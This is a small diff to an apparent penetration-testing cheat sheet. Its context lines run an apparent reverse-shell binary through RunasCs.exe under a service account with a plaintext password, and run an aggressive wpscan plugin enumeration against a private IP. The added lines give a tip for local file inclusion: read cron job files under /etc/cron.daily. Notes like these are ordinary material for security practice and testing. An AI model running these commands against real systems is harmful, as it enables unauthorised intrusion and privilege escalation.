@@ -79,3 +79,11 @@ PS C:\tools> .\RunasCs.exe svc_mssql trustno1 "cmd /c c:\tools\rshell.exe"
 ```
 wpscan --update --url http://192.168.169.167/ --enumerate ap --plugins-detection aggressive
 ```
+
+### LFI
+
+check for cron jobs as well 
+
+```
+/etc/cron.daily/<file> 
+```
